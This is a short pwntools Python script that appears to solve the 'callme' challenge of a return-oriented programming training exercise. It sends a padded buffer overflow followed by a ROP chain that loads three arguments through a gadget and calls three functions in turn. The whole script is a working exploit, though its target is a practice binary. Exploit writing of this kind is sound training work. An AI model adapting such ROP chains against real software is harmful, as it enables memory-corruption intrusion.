#!/bin/python2.7
from pwn import *
context.update(arch='x86_64', os='linux')
context.terminal = ['urxvt', '-e', 'sh', '-c']
path = "./callme"
p = process(path)
# (address of gadget + values wanted on stack + function to call) * 3
args = p64(0x1) + p64(0x2) + p64(0x3)
load_args = p64(0x401ab0) + args
shellcode = load_args + p64(0x00401850) + load_args + p64(0x00401870) + load_args + p64(0x00401810)
p.sendline('\xef\xbe\xad\xde' * 10 + shellcode)
print p.recvall()
